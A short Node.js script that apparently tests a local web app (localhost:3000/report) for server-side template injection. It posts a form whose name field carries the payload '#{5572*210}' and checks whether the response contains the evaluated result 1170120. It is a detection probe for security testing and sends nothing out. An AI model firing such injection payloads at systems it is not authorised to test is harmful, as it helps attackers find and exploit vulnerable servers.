const fetch = require("node-fetch");

// ПРИ НЕОБХОДИМОСТИ ПОМЕНЯТЬ HOST И PORT
const url = "http://localhost:3000/report";
const vulnerabilityData = {
    name: "#{5572*210}",
    email: "test@test.com",
    problem: "Описание"
}

fetch(url, {
    method : "POST",
    body: JSON.stringify(vulnerabilityData),
    headers: {'Content-Type': 'application/json'}
}).then(
    response => response.text()
).then(
    html => {
        const isVulnerability = html.indexOf("1170120") !== -1 && html.indexOf("#{5572*210}") === -1;
        console.log(isVulnerability ? "App is vulnerable!!!" : "App is not vulnerable.")
    }
);


